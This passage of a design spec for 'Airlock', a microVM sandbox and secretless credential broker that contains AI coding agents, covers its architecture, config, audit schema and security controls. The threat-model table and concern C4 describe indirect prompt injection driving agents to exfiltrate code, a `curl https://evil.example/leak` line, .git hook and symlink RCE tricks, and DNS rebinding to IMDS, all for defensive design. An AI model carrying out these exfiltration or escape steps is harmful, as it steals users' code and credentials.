    subgraph TZ2["Airlock Control Plane & Broker (TZ-2)"]
        Harness["Agent Harness / CLI / Python & TS SDK"]
        Daemon["airlockd (Lifecycle, Warm Pool, CoW Prep, Commit Gate)"]
        Broker["airlock-broker (vsock Mux, Ephemeral CA, L7 Policy, Git pkt-line, SSRF Guard)"]
        Harness -->|"gRPC / REST (Unix Socket or mTLS)"| Daemon
        Daemon -->|"Scrub & Snapshot"| Repo
        Daemon -->|"Mint Leases & Verify"| Broker
        Broker <-->|"Lazy Secret Fetch"| Creds
        Daemon -->|"Atomic Apply + Hash Chain"| Undo
        Broker -->|"Redacted Events"| Undo
    end

    subgraph TZ1["De-Privileged Hypervisor Sandbox (TZ-1)"]
        VMM["Apple VZ (airlock-vz-helper) or Firecracker + jailer"]
    end

    subgraph TZ0["Untrusted Guest MicroVM Chamber (TZ-0)"]
        GuestD["airlock-guestd (PID 1 init, Exec RPC, Diff Export)"]
        NetStack["127.0.0.1:3128 Proxy + tun0 (100.64.0.2) + DNS Stub (127.0.0.53)"]
        FS["overlayfs (/workspace): RO Scrubbed Base + RW Ephemeral ext4"]
        AgentProc["Untrusted Agent Shell / Code / Tests / Packages"]
        AgentProc --> NetStack
        AgentProc --> FS
        NetStack --> GuestD
        FS --> GuestD
    end

    subgraph TZ4["Upstream Services (TZ-4)"]
        Ext["GitHub / LLM APIs / Package Registries"]
    end

    Daemon -->|"Spawn / Control VMM"| VMM
    VMM -.->|"Isolates"| TZ0
    GuestD <-->|"AF_VSOCK (Zero virtio-net)"| Broker
    Broker -->|"Validated TLS + Real Credential on Wire"| Ext
```

### 7.2 Proposed Repository Layout (Greenfield Blueprint)

```text
airlock/
├── Cargo.toml                     # Rust workspace manifest
├── crates/
│   ├── airlock-cli/               # clig.dev-compliant CLI (`airlock`) & Commit Gate TUI
│   ├── airlockd/                  # Control daemon, warm pool, CoW prep, Commit Gate, audit chain
│   ├── airlock-broker/            # AF_VSOCK mux, ephemeral CA, hyper/rustls L7 proxy, SSRF & Git pkt-line guard
│   ├── airlock-vmm/               # HypervisorBackend trait: Firecracker + jailer, Apple VZ IPC client
│   ├── airlock-guestd/            # Static musl PID-1/init daemon inside guest VM
│   ├── airlock-policy/            # airlock.toml parser, HMAC phantom tokens, forward-compat seams
│   └── airlock-proto/             # Protobuf/gRPC + vsock binary framing definitions
├── macos/
│   └── airlock-vz-helper/         # Minimal signed Swift daemon holding com.apple.security.virtualization
├── guest/
│   └── image/                     # Reproducible Linux 6.12 LTS kernel configs (x86_64, aarch64) & rootfs
├── sdks/
│   ├── python/                    # `airlock-sdk` + LangGraph, Claude Agent SDK, OpenAI Agents SDK, OpenHands adapters
│   └── typescript/                # `@airlock/sdk` + TS harness adapters
└── tests/
    ├── redteam/                   # Prompt-injection, SSRF, symlink, hook, and secret-leak test suite
    └── integration/               # Cross-platform AT-1..AT-14 test harness
```

### 7.3 Key Sequence Flows

#### Flow A: Secretless `git push` & HTTPS API Egress over `vsock`
```mermaid
sequenceDiagram
    autonumber
    actor Agent as "Agent Process (TZ-0)"
    participant GuestD as "airlock-guestd + Proxy/tun0 (TZ-0)"
    participant Broker as "airlock-broker (TZ-2)"
    participant Creds as "GitHub App / Keychain (TZ-3)"
    participant GH as "github.com (TZ-4)"

    Note over Agent,GuestD: "Guest env has GITHUB_TOKEN=airlock-phantom:cap_gh_9f2a..."
    Agent->>GuestD: "git push origin HEAD:agent/fix-42 (HTTPS via 127.0.0.1:3128)"
    GuestD->>Broker: "AF_VSOCK frame (CID=7, stream_type=HTTP_CONNECT, host=github.com:443)"
    Broker->>Broker: "Policy check: host allowed; DNS resolve + SSRF private IP block"
    Broker->>GuestD: "TLS handshake with ephemeral per-chamber CA cert"
    GuestD->>Broker: "HTTPS POST /org/app.git/git-receive-pack + phantom token"
    Broker->>Broker: "Verify HMAC(chamber_id, CID=7, cap_gh); parse pkt-line refname"
    alt "refname == refs/heads/main or force-push disallowed"
        Broker-->>GuestD: "HTTP 403 Forbidden (POLICY_REF_DENIED) + Audit Event"
    else "refname matches refs/heads/agent/*"
        Broker->>Creds: "Fetch/mint short-lived GitHub installation token"
        Broker->>GH: "Forward TLS stream with real Authorization token (pin validated IP)"
        GH-->>Broker: "200 OK (pack-status)"
        Broker->>Broker: "Scrub response for credential substrings; append hash-chained audit entry"
        Broker-->>GuestD: "200 OK -> git push succeeds"
    end
```

#### Flow B: Session Completion, CoW Diff Extraction & Atomic Commit Gate
```mermaid
sequenceDiagram
    autonumber
    actor Dev as "Developer (TZ-3)"
    participant Daemon as "airlockd + Commit Gate (TZ-2)"
    participant GuestD as "airlock-guestd (TZ-0)"
    participant Repo as "Host Repo & Undo Journal (TZ-3)"

    Dev->>Daemon: "airlock commit <chamber_id>"
    Daemon->>GuestD: "vsock RPC: DIFF_EXPORT (read CoW upperdir)"
    GuestD-->>Daemon: "Canonical manifest + modified file blobs/diffs"
    Daemon->>Daemon: "Validate: path traversal, symlink bounds, no dev/setuid, protected paths, secret scan"
    Daemon->>Repo: "Compare host SHA-256 digests vs baseline (3-way conflict check)"
    alt "Structural violation (symlink escape / traversal)"
        Daemon-->>Dev: "Hard Reject [BLOCKED]: unsafe filesystem object"
    else "Clean or requires review"
        Daemon-->>Dev: "Present Commit Gate summary (files, protected paths, secrets) [Approve / Reject]"
        Dev->>Daemon: "Approve"
        Daemon->>Repo: "Write original host files to undo/<session_id>/ backup journal"
        Daemon->>Repo: "Stage temp files + fsync + atomic rename(2) into host repo"
        Daemon->>Repo: "Append COMMIT_APPLIED to audit.jsonl"
    end
```

### 7.4 `vsock` Multiplexed Framing Protocol
Every frame over the single per-chamber `AF_VSOCK` transport uses a compact little-endian binary header so guest control RPCs, L7 proxy streams, fallback `tun0` TCP streams, DNS requests, and diff exports share one auditable connection:

```text
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Magic (0x414C)       |  Version (1)  |  Stream Type  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Stream ID                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Flags     |  Reserved (0) |       Context TLV Length      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Payload Length                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|        Context TLVs (0 bytes in Phase 1; Phase 2/3 seam)      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Payload (Variable)                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

- **`Stream Type`:** `0x01` `EXEC_CTRL`, `0x02` `EXEC_IO`, `0x03` `HTTP_CONNECT`, `0x04` `L4_TUN_TCP`, `0x05` `DNS_QUERY`, `0x06` `DIFF_EXPORT`, `0x07` `HEARTBEAT`.
- **`Flags`:** `0x01` `FIN` (half-close), `0x02` `RST` (abort), `0x04` `ACK`.
- **Flow Control:** Per-stream sliding window credit announcements (`WINDOW_UPDATE` control frames) prevent a noisy `stdout` or `curl` download from starving `EXEC_CTRL` or `HEARTBEAT`.

### 7.5 Forward-Compatibility Seams for Phases 2 & 3
To ensure Phase 2 (IsolateGPT MCP spokes) and Phase 3 (eBPF LSM + CaMeL/FIDES IFC) land without breaking Phase 1 wire protocols or manifests:
1. **`Context TLV` Header Slot:** Every `vsock` frame and `CapabilityHandle` struct reserves `principal_id` (always `"agent:main"` in Phase 1; `"mcp:<server>"` in Phase 2) and `taint_labels` (`confidentiality: u8`, `integrity: u8` — `0`/`UNSET` in Phase 1; kernel/planner-populated in Phase 3).
2. **`airlock.toml` Schema Versioning:** `version = "1"` cleanly parses `[chamber]`, `[workspace]`, `[[capabilities]]`, `[commit_gate]`, and `[audit]`. Presence of future `[mcp]` or `[ifc]` tables triggers a clear, explicit parser error (`"Table [mcp] requires Airlock Phase 2; upgrade runtime or remove section"`) instead of silent misconfiguration.
3. **Trace & Step Correlation:** `agent_step_id` is already first-class on `exec` RPCs and `audit.jsonl`, allowing Phase 3 dual-LLM planner graphs to attach provenance without schema refactoring.

---

## 8. Configuration, API Contracts & Data Schemas

### 8.1 Annotated `airlock.toml` Example

```toml
version = "1"

[chamber]
target = "local"                   # "local" | "remote"
profile = "standard"               # "standard" (minimal) | "containers" (with rootless podman)
vcpus = 2
memory_mib = 4096
disk_upper_mib = 8192
max_pids = 512
ttl_seconds = 3600
idle_ttl_seconds = 900

[workspace]
scrub_globs = [
  ".env", ".env.*", "!.env.example", "!.env.template",
  "*.pem", "*.key", "*.p12", ".npmrc", ".pypirc", ".netrc"
]
synthesize_env_from_example = true
protected_paths = [
  ".git/**", ".github/workflows/**", ".airlock/**",
  "airlock.toml", "Dockerfile", "Makefile"
]

[[capabilities]]
id = "github_agent_pr"
type = "git_http"
provider = "github_app"            # Mints short-lived installation token in broker
hosts = ["github.com", "api.github.com"]
allow_methods = ["GET", "POST"]
allow_paths = [
  "/org/app.git/info/refs*",
  "/org/app.git/git-upload-pack",
  "/org/app.git/git-receive-pack",
  "/repos/org/app/pulls*"
]
allowed_branches = ["refs/heads/agent/*"]
allow_force_push = false
env_var = "GITHUB_TOKEN"           # Phantom token injected as GITHUB_TOKEN
rate_limit_rpm = 60

[[capabilities]]
id = "llm_anthropic"
type = "http"
provider = "keychain:airlock/anthropic_api_key"
hosts = ["api.anthropic.com"]
allow_methods = ["POST"]
allow_paths = ["/v1/messages"]
inject_header = "x-api-key"
env_var = "ANTHROPIC_API_KEY"
max_budget_usd = 5.00
rate_limit_rpm = 30

[[capabilities]]
id = "pkg_registries"
type = "http"
provider = "none"                  # Public read-only access; zero secrets
hosts = ["registry.npmjs.org", "pypi.org", "files.pythonhosted.org", "crates.io"]
allow_methods = ["GET", "HEAD"]
strip_query_params = true          # Coarse covert query exfiltration mitigation
tls_mode = "terminate"             # Or "sni_passthrough" for cert-pinned read-only CDNs

[commit_gate]
mode = "interactive"               # "interactive" | "review_protected_only"
secret_scan = "block"              # "block" | "warn"
max_diff_mib = 50

[audit]
log_dir = "~/.local/state/airlock/audit"
hash_chain = true
capture_http_bodies = false
retention_days = 30
```

### 8.2 Control Plane API Endpoints (Local Unix Socket & Remote mTLS REST/gRPC)

| Method & Path | Purpose | Auth & Notes |
|---|---|---|
| `POST /v1/chambers` | Provision chamber from warm pool, attach `Scrubbed Base`, return `chamber_id` + phantom capability metadata | Peer UID (`local`) / mTLS+OIDC (`remote`) |
| `POST /v1/chambers/{id}/exec` | Execute command inside chamber; bidirectional streaming (`stdout`, `stderr`, `stdin`, `exit_code`, `agent_step_id`) | gRPC stream / WebSocket upgrade |
| `GET /v1/chambers/{id}/diff` | Retrieve Commit Gate manifest (changed files, protected-path flags, secret findings, 3-way conflict state) | Read-only; zero host mutation |
| `POST /v1/chambers/{id}/commit` | Apply approved subset/full diff atomically to host workspace with undo journal snapshot | Requires approval token / interactive confirmation |
| `POST /v1/chambers/{id}/undo` | Atomically restore pre-commit host files from `undo/<session_id>/` journal | Idempotent on unapplied session |
| `GET /v1/chambers/{id}/audit` | Stream hash-chained `audit.jsonl` records | Redacted by `FR-AUD-4` |
| `DELETE /v1/chambers/{id}` | Unmount, destroy VMM, wipe ephemeral `upperdir` and session CA key | Immediate teardown |

### 8.3 Audit Event Schema (`audit.jsonl`)

```json
{
  "seq": 42,
  "timestamp": "2026-11-20T22:14:09.412Z",
  "prev_hash": "sha256:8c1f9b7e2d...",
  "event_hash": "sha256:3a4401d9e8...",
  "chamber_id": "chmb_01JE8K9W2M",
  "vsock_cid": 7,
  "principal_id": "agent:main",
  "agent_step_id": "step_0019",
  "traceparent": "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01",
  "event_type": "BROKER_GIT_PUSH",
  "capability_id": "github_agent_pr",
  "decision": "DENY",
  "reason_code": "POLICY_REF_DENIED",
  "http": {
    "method": "POST",
    "host": "github.com",
    "path": "/org/app.git/git-receive-pack",
    "resolved_ip": "140.82.114.4",
    "git_ref": "refs/heads/main",
    "status": 403,
    "latency_ms": 4
  },
  "redactions_applied": ["phantom_token_stripped"]
}
```

---

## 9. Security Design & Threat Model

### 9.1 Security Controls (`SEC`)
- **`SEC-1` Minimal Hypervisor Privileges:** Linux remote/local Firecracker runs with seccomp level 2 filters, `jailer` `chroot`, non-root UID/GID, and `cgroup v2` quotas. macOS `airlock-vz-helper` ships with Hardened Runtime, no network-server/JIT entitlements, and exclusively `com.apple.security.virtualization`.
- **`SEC-2` Hardened Guest Kernel:** Custom Linux 6.12 LTS config disables `CONFIG_MODULES`, `CONFIG_KEXEC`, `CONFIG_DEVMEM`, `CONFIG_KALLSYMS` (non-debug), and disables `io_uring` via `kernel.io_uring_disabled=2` to reduce kernel attack surface inside `TZ-0`.
- **`SEC-3` In-Memory Ephemeral CA Keys:** Per-chamber Root CA private keys reside strictly in `mlock()`ed host RAM (`zeroize` on drop), never hit disk, and expire automatically within 24 hours.
- **`SEC-4` CID-Bound Phantom Tokens:** Every phantom token includes an HMAC-SHA256 tag over `(master_ephemeral_key, chamber_id, vsock_cid, capability_id)`. Copying a phantom token out of the chamber renders it useless outside that exact `(chamber_id, vsock_cid)` tuple.
- **`SEC-5` Single-Resolve SSRF Pinning:** `airlock-broker` resolves DNS once inside `TZ-2`, validates all returned A/AAAA records against RFC/IANA non-public CIDR denylists (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`), and opens the TCP socket directly to the validated IP (immune to TOCTOU DNS rebinding).
- **`SEC-6` Host RCE Vector Blocking at Commit Gate:** `.git/hooks/*`, `.git/config` (`fsmonitor`, `sshCommand`, `pager`), symlinks escaping workspace root, and special filesystem nodes are neutralized before touching `TZ-3`.
- **`SEC-7` Signed Guest Image Verification:** `airlockd` verifies detached Ed25519 signatures and SHA-256 digests of `vmlinux`/`Image` and rootfs images before every VMM boot (SLSA Level 3).
- **`SEC-8` Pre-Mount Workspace Scrubbing:** Secrets are removed from the APFS clone / excluded from `mkfs.erofs` *prior* to VMM launch — the guest never observes deleted file sectors or APFS snapshots containing `.env`.
- **`SEC-9` Control Plane Peer Auth:** Local Unix socket verifies connecting UID via `SO_PEERCRED` (Linux) / `LOCAL_PEERCRED` (macOS) matching the daemon owner; remote API enforces mTLS + short-lived OIDC JWTs.
- **`SEC-10` Teardown Zeroization:** Ephemeral `upperdir` ext4 files and APFS clones are unlinked and trimmed/zeroized; memory-held capability secrets are zeroed immediately on chamber close.
- **`SEC-11` Request-Smuggling Prevention:** Broker HTTP termination uses strict memory-safe `hyper` + `rustls` parsers rejecting ambiguous `Content-Length` + `Transfer-Encoding` headers, bare `\n` line endings, and invalid HTTP/2 pseudo-headers.
- **`SEC-12` Secret-Free Logs:** A streaming Aho-Corasick / regex scrubber runs inside `airlockd` and `airlock-broker` prior to writing `audit.jsonl` or `stderr` diagnostics (`AT-11`).

### 9.2 Threat Model (Top Phase 1 Threats & Honest Residual Risks)

| ID | Threat / Attack Scenario | Phase 1 Mitigation | Residual Risk & Phase 2/3 Closure |
|---|---|---|---|
| **T1** | Indirect prompt injection reads source code and runs `curl https://evil.example/leak` | Zero `virtio-net`; `vsock`-only default-deny broker blocks unlisted domains (`FR-NET-4`, `AT-3`). | **Negligible** for unlisted destinations. |
| **T2** | Indirect prompt injection exfiltrates proprietary code over an *allowed* domain (e.g., `pypi.org` query params or allowed GitHub PR body) | `GET`/`HEAD`-only + `strip_query_params` on registries; branch-scoped Git rules; rate caps (`C4`). | **High residual risk for allowed write sinks** (LLM prompt reflection, allowed PR text). Closed structurally only in **Phase 3 (eBPF taint + CaMeL/FIDES IFC)**. |
| **T3** | Malicious package (`npm postinstall`) tries to steal `~/.ssh`, `~/.aws`, or `.env` | Hardware microVM mounts only `Scrubbed Base`; `$HOME` and `.env` absent (`FR-FS-1`, `FR-FS-2`, `AT-1`, `AT-2`). | **Low** (bounded to explicitly `allow_env` non-secret variables). |
| **T4** | Hijacked agent runs `git push --force origin main` or deletes repo | Broker Git smart-HTTP pkt-line parser blocks non-`agent/*` refs and force-pushes; HTTP `DELETE` denied (`FR-BRK-6`, `AT-5`). | **Low** (agent can still push junk to `agent/*` branch up to rate limit). |
| **T5** | Guest writes `.git/hooks/post-checkout` or `.git/config` `core.fsmonitor` to gain host RCE on next host `git` invocation | Commit Gate flags/blocks `.git/**` protected paths (`FR-CMT-3`, `AT-7`). | **Low** (depends on operator not approving `.git` overrides blindly; mitigated by anti-habituation UI). |
| **T6** | Symlink traversal attack in `upperdir` (`ln -s ~/.ssh/authorized_keys out`) | Commit Gate validates canonical target containment inside repo root and rejects special files (`FR-CMT-2`, `AT-7`). | **Negligible** (host writes go through `openat`/no-follow checks). |
| **T7** | DNS rebinding attack (`evil.com` resolves to `127.0.0.1` or `169.254.169.254` IMDS) | Host-only DNS + single-resolve post-DNS IP guard pinning direct IP dial (`FR-NET-6`, `AT-6`). | **Negligible**. |
| **T8** | Guest exfiltrates phantom token in chat/PR output and attacker replays it externally | Phantom token is valid only over the originating `(chamber_id, vsock_cid)` socket; external replay returns `403` (`SEC-4`, `AT-4`). | **Negligible** (attacker learns token string only, zero privilege). |
| **T9** | Guest kernel compromise attempts VMM escape via malformed `virtio-vsock` / `virtio-blk` / `virtio-fs` | Firecracker `jailer` (`chroot` + `seccomp` + UID isolation) or macOS Hardened Runtime; minimal guest kernel (`SEC-1`, `SEC-2`). | **Low** (hypervisor/Apple VZ zero-day defense-in-depth). |
| **T10** | Runaway agent loop causes fork bomb, disk fill, or $500 LLM API bill | `pids.max`, `disk_upper_mib`, `ttl_seconds`, and hard `max_budget_usd` / `rate_limit_rpm` caps (`FR-VM-3`, `FR-BRK-8`). | **Low** (soft spend latency within single in-flight streaming request). |

---

## 10. UX & Developer Experience Requirements

### 10.1 CLI Ergonomics (`clig.dev`)
- **`UX-1` Zero-Config Quickstart:** `airlock init` scans repository files (`package.json`, `pyproject.toml`, `Cargo.toml`, `.env.example`, `.git/config`) and generates a commented least-privilege `airlock.toml` with zero raw secrets copied.
- **`UX-2` Sub-Second Warm Execution:** `airlock run -- <cmd>` acquires a warm chamber in ≤ 250 ms p95, streams TTY/stdout smoothly, and summarizes diff status on exit.
- **`UX-3` Machine-First & Human-First Output Parity:** Primary output goes to `stdout`; progress spinners, warnings, and policy notices go to `stderr` (suppressed or structured when `--json` is passed).
- **`UX-4` Deterministic Semantic Exit Codes:** Default passthrough preserves the guest command's exit code (`0`–`125`); optional `--separate-exit-codes` (or CLI-native errors when guest never launched) uses `70` (chamber infra failure), `77` (broker policy/capability denial), `78` (invalid `airlock.toml`), and `79` (Commit Gate rejected by policy or user).

### 10.2 Accessibility (`WCAG 2.2 AA`)
- **`UX-5` Non-Colour-Only Dual Encoding:** Status states never rely solely on colour; every badge pairs an explicit uppercase text label + symbol + ≥ 4.5:1 AA-contrast ANSI/UI colour:
  - `[SEALED]` (Chamber isolated), `[ALLOW]` (Broker permit), `[REVIEW]` (Protected path / HITL needed), `[BLOCKED]` (Policy / scanner rejection).
- **`UX-6` `NO_COLOR` & Screen-Reader Mode:** Respect `NO_COLOR=1`, `CLICOLOR=0`, and `TERM=dumb` automatically; provide `--plain` across `diff`, `commit`, and `logs` for linear, non-box-drawn screen-reader output.
- **`UX-7` Keyboard-First Commit Gate TUI:** Full keyboard operability (`j`/`k` navigate, `Enter` expand diff, `Space` toggle file, `a` approve, `r` reject, `?` help) without requiring mouse gestures or timed confirmation timeouts.

### 10.3 Actionable Policy-Denial Diagnostics
- **`UX-8` Constructive Denial Messages:** When `airlock-broker` denies an egress call, guest error bodies and host CLI diagnostics state **what** was attempted, **why** it was blocked, and **the narrowest capability snippet** to allow it — **never** suggesting disabling Airlock:

```text
[BLOCKED] Airlock Broker denied outbound request (exit/http 403 · POLICY_REF_DENIED)
  Chamber:    chmb_01JE8K9W2M (vsock CID 7, pid 184 "git-remote-https")
  Attempted:  POST https://github.com/org/app.git/git-receive-pack -> ref refs/heads/main
  Rule:       [[capabilities]] id="github_agent_pr" allows only ["refs/heads/agent/*"]
  Fix:        Push to an agent branch (`git push origin HEAD:agent/my-fix`), or update
              `allowed_branches` in airlock.toml (never bypass with direct host push).
```

### 10.4 Anti-Habituation HITL Design
- **`UX-9` Two-Boundary Prompt Discipline:** Developers are never interrupted mid-run for routine file edits or allowed reads (`0` mid-session prompts in standard workflows). Review concentrates at two meaningful points: capability escalation and the **Commit Gate**.
- **`UX-10` Equal-Weight Actions & Impact Previews:** Commit Gate displays a plain-language impact summary *above* the raw diff (`"12 source files modified · 0 protected files · 0 secrets detected"`) and gives `[Approve & Apply]` and `[Reject & Keep Staged]` equal visual prominence. When protected paths (e.g., `.github/workflows/ci.yml`) or secret matches appear, an unmistakable `[REVIEW]` callout explains the exact host risk before prompting.

---

## 11. Brand Guidelines

### 11.1 Positioning & Metaphor
**Airlock** uses the physical metaphor of a spacecraft or cleanroom airlock: an engineered pressure-lock separating an unverified external workspace from the developer's trusted workstation and production credentials. The brand communicates **precision, containment, and calm confidence** — neither alarmist nor opaque.

### 11.2 Canonical Vocabulary

| Concept | Canonical Term | Prohibited Terms (Do Not Use in UI, Docs, or Logs) |
|---|---|---|
| Isolated microVM | **Chamber** | Jail, Prison, Trap, Cage, Quarantine Box |
| Enabling isolation | **Seal** / **Sealed** | Lock down, Arrest, Spy-proof |
| Host-side proxy | **Broker** | Interceptor, Sniffer, MITM Spy |
| Permission grant | **Capability** | Whitelist, Bypass, Backdoor |
| Diff review & apply | **Commit Gate** | Gatekeeper, Kill-switch, Nuke-check |
| Filtered workspace | **Scrubbed Base** | Stripped, Sanitized Dump |

### 11.3 Identity & Voice Tokens

| Identity Slot | Phase 1 Specification / Token |
|---|---|
| **Voice & Tone** | Calm, concise, technical, second-person direct (*"Chamber sealed. 0 secrets mounted."* — never *"DANGER! Untrusted AI contained!"*). |
| **Semantic Palette (Dark & Light Terminal AA ≥ 4.5:1)** | `sealed/allow`: Deep Emerald (`#0F766E` light / `#34D399` dark); `review/warn`: Amber Ochre (`#B45309` light / `#FBBF24` dark); `blocked/error`: Crimson (`#B91C1C` light / `#F87171` dark); `neutral/meta`: Slate (`#475569` light / `#94A3B8` dark). |
| **Typography Defaults** | Monospace: `JetBrains Mono`, fallback `ui-monospace` (diffs, hashes, `airlock.toml`); Sans: `Inter`, fallback `system-ui` (HTML reports, docs, web views). |
| **Logo & Wordmark** | *TBD* — Stylized split-chamber mark (cleanroom interlock icon); geometric spec to be finalized before public GA. |
| **Trademark & Domain Clearance** | *TBD* — Blocked on **D-10** prior to public binary/crate release. |

---

## 12. Areas of Concern & Unresolvable Policy Contradictions

Where organizational security policies, `intent.md` goals, OS realities, and developer UX norms directly contradict one another, Phase 1 documents each conflict candidly rather than paper over it.

### `C1` — `intent.md` Local `Seatbelt`/`Landlock` Fallback vs. Zero-Bypass Hardware Isolation & `vsock`-Only Policy (`DECIDED — D-1`)
- **The contradiction:** `intent.md` (§4 Layer 1) mentions falling back to `Landlock`/`Seatbelt` for "read-only/low-risk commands", while also mandating `vsock`-only zero-direct-internet networking and zero `$HOME`/secret visibility in Phase 1.
- **Why both cannot hold:** Apple has deprecated `sandbox-exec` (`Seatbelt`); both `Seatbelt` and Linux `Landlock` share the host kernel and host socket table (exposing `127.0.0.1` services unless complex namespace/netfilter tricks are added), cannot perform unprivileged `overlayfs` CoW cleanly across macOS/Linux without root or FUSE overhead, and cannot enforce `vsock`-only guarantees. Furthermore, classifying an arbitrary agent shell command as "low-risk" statically is undecidable (e.g., `python -c ...` or `make test`).
- **Adopted resolution (`D-1`):** **Forbid `Seatbelt`/`Landlock` fallback in Phase 1**; rely strictly on hardware microVMs amortized via the warm pool (`FR-VM-2`, ≤ 250 ms acquisition). Only consider `Seatbelt`/`Landlock` if explicitly required for KVM-less CI runners with a prominent `[DEGRADED ISOLATION]` banner.

### `C2` — "Zero `.env` / Keys in Sandbox" Policy vs. Drop-In Developer UX & Client-Side Crypto Protocols (`DECIDED — D-2`)
- **The contradiction:** Security requires zero `.env` files and zero keys in guest memory, whereas real repositories fail tests or dev servers if `PORT`, `DATABASE_URL`, `AWS_*` SigV4 signing, or JWT/HMAC test keys are missing.
- **Why both cannot fully hold:** Phantom token header swaps work cleanly for Bearer/API keys (`Authorization`, `x-api-key`, Git HTTPS), **but fail for protocols that sign request payloads locally inside guest SDKs** (AWS SigV4, PostgreSQL SCRAM-SHA-256, mTLS client certs, local Stripe webhook HMACs) because the client SDK needs the actual signing secret bytes unless the protocol itself is terminated and re-signed at the broker.
- **Adopted resolution (`D-2`):** Strip `.env*` by default; synthesize safe non-secret defaults from `.env.example` + phantom tokens (`FR-FS-4`). Add an optional AWS SigV4 re-signing adapter in `airlock-broker` (M2), and provide explicit diagnostic errors when a workload attempts client-side HMAC/DB auth without dedicated mock test credentials (`.env.airlock.test`).

### `C3` — L7 Secret Injection & Path Policy vs. End-to-End TLS Integrity & Certificate Pinning (`DECIDED — D-3`)
- **The contradiction:** Inspecting HTTP methods/paths, stripping query params, parsing Git pkt-lines, and injecting real credentials on the wire requires `airlock-broker` to terminate TLS using an ephemeral session CA (`FR-BRK-4`). However, TLS interception breaks binaries that perform strict SPKI/certificate pinning (e.g., certain Rust/Go binaries, mobile toolchains, or security scanners).
- **Why both cannot hold:** Under TLS 1.3 without termination, the broker sees only the outer TCP endpoint and SNI hostname — it cannot read HTTP paths/methods, inspect Git branch pushes, or inject `Authorization` headers.
- **Adopted resolution (`D-3`):** Default to L7 TLS termination via per-chamber ephemeral CA (`FR-BRK-4`), and support opt-in `tls_mode = "sni_passthrough"` **exclusively** for read-only, zero-credential public domains (`FR-BRK-9`). Cert-pinned *authenticated* APIs are incompatible with secretless wire injection in Phase 1.

### `C4` — Developer Package-Install UX vs. Covert Exfiltration Over Allowed Domains Prior to Phase 3 IFC (`MITIGATED IN PHASE 1 / PHASE 3 IFC CLOSURE — D-4`)
- **The contradiction:** Coding agents routinely need `npm install`, `pip install`, `cargo fetch`, plus LLM API calls (`api.anthropic.com`) and GitHub PR creation (`api.github.com`). Yet without Phase 3 kernel eBPF taint tracking and CaMeL/FIDES semantic IFC, an agent prompt-injected by a malicious repo file can encode source code into an *allowed* outbound call (e.g., an LLM tool response, a GitHub PR comment, or a package lookup path).
- **Why Phase 1 cannot close it completely:** Firecracker + `vsock` + L7 broker inspects *where* bytes go and *which API action* is called, not *whether those bytes originated from a sensitive file mixed with untrusted web input*.
- **Adopted mitigation (`D-4`):** Enforce `GET`/`HEAD`-only + `strip_query_params = true` on package registries, strict repo/branch scoping on GitHub, and offer an `--offline` / pre-warmed dependency cache profile for regulated codebases. Document explicitly (`NG7`, `T2`) that structural data-flow closure waits for Phase 3.

### `C5` — Frictionless Agent Autonomy UX vs. Security HITL Approval Gates (`DECIDED — D-5`)
- **The contradiction:** Security teams prefer per-action approval on risky mutations, whereas UX studies and NIST/Nielsen guidelines prove frequent repetitive modal prompts induce **approval fatigue (habituation)**, causing developers to click "Approve" reflexively.
- **Adopted resolution (`D-5`):** Concentrate HITL checkpoints strictly at two natural boundaries: (1) static capability escalation in `airlock.toml` and (2) the **Commit Gate** (`UX-9`), batching all intermediate edits inside the CoW chamber autonomously.

### `C6` — "Identical Local ↔ Remote Execution" (`intent.md` §4) vs. Hardware & OS Divergence (`DECIDED — D-6`)
- **The contradiction:** `intent.md` targets identical local and remote behavior, yet local developer laptops are overwhelmingly `aarch64` Apple Silicon macOS while many cloud VMs are `x86_64` Linux. Furthermore, macOS `Virtualization.framework` supports `virtio-fs` whereas Linux Firecracker does not (`EROFS` block image instead), and Windows lacks Phase 1 native VMM support.
- **Adopted resolution (`D-6`):** Standardize identical **guest Linux 6.12 userspace, `airlock.toml` semantics, `vsock` framing, and broker policy** while explicitly publishing dual-arch (`aarch64` + `x86_64`) guest images (`D-6`) and documenting CPU architecture / Rosetta caveats upfront in `airlock doctor` and docs.

### `C7` — Immutable Forensic Audit Trail vs. Privacy & Zero-Secret Persistence Policies (`DECIDED — D-7`)
- **The contradiction:** Forensic incident response benefits from capturing full HTTP requests/responses (`intent.md` §4.5), while security and privacy policies forbid persisting customer code snippets, PII, or credential material on disk.
- **Adopted resolution (`D-7`):** Default `audit.jsonl` stores **structural, redacted metadata** (method, host, path template, git ref, decision, latency, `agent_step_id`) protected by SHA-256 hash chaining (`FR-AUD-1`) and pre-write secret scrubbing (`FR-AUD-4`), keeping `capture_http_bodies = false` by default (`D-7`).

### `C8` — Unmistakable Risk Warnings vs. Calm Non-Alarmist Brand Voice (`RESOLVABLE`)
- **The contradiction:** Mandatory security disclosures (e.g., `.git/hooks` modification or leaked key match at Commit Gate) must unambiguously halt careless approval without adopting punitive or fear-inducing wording forbidden by Brand §11.
- **Resolution:** Use calm, concrete, impact-oriented factual copy paired with WCAG AA `[REVIEW]` / `[BLOCKED]` visual indicators (e.g., *"1 protected path modified: `.git/hooks/post-checkout` executes automatically on host checkout. Review carefully before approving."*).

### `C9` — Workspace Directory Path Hygiene (`.../Planes/Airlock ` Trailing Space Hazard) (`DECIDED — D-10`)
